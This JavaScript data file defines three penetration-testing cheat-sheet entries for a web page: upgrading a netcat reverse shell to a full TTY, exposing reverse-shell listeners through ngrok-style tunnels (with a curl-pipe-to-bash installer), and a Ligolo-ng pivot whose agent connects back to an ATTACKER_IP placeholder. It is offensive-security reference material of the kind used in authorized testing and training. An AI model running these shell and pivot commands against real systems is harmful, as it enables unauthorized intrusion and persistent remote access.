
import { Terminal, Monitor, Share2 } from 'lucide-react';

export const guides = [
  {
    title: 'Python TTY Upgrade',
    category: 'Linux',
    description: 'Upgrade a standard NC shell to a fully functional interactive TTY with tab-completion and history.',
    icon: Terminal,
    language: 'bash',
    code: `# Step 1: Spawn PTY Shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background (CTRL+Z) and set local terminal to raw mode
stty raw -echo; fg

# Step 3: Set Terminal Environment Variables
export TERM=xterm
# Optional: Try listening with rlwrap for shell history
# rlwrap nc -lnvp 1234`
  },
  {
    title: 'Public Reverse Shell Tunneling',
    category: 'Network',
    description: 'Expose local exploit listeners to the public internet using tunneling services to bypass NAT.',
    icon: Share2,
    language: 'bash',
    code: `# --- OPTION 1: PIGGY (Free TCP/HTTP) ---
# Install: curl -s https://piggy.run/install.sh | bash
piggy tunnel tcp 4444

# --- OPTION 2: NGROK (Common Standard) ---
# Note: TCP requires account auth token
ngrok tcp 4444`
  },
  {
    title: 'Ligolo-ng Pivot',
    category: 'Network',
    description: 'Modern tunneling methodology for Active Directory and internal network pivots.',
    icon: Monitor,
    language: 'bash',
    code: `# --- ON ATTACK HOST (Proxy Setup) ---
sudo ./proxy -selfcert -laddr 0.0.0.0:443
# interface_create --name "ligolo"

# --- ON PIVOT HOST (Agent Connection) ---
./agent -connect <ATTACKER_IP>:443 -ignore-cert 

# --- ON ATTACK HOST (Tunnel Ops) ---
# session
# tunnel_start --tun ligolo
# interface_add_route --name ligolo --route 10.10.10.0/24
# Note: Use 240.0.0.1/32 for pivot machine localhost`
  }
];

export const guideCategories = ['All', 'Linux', 'Network'];
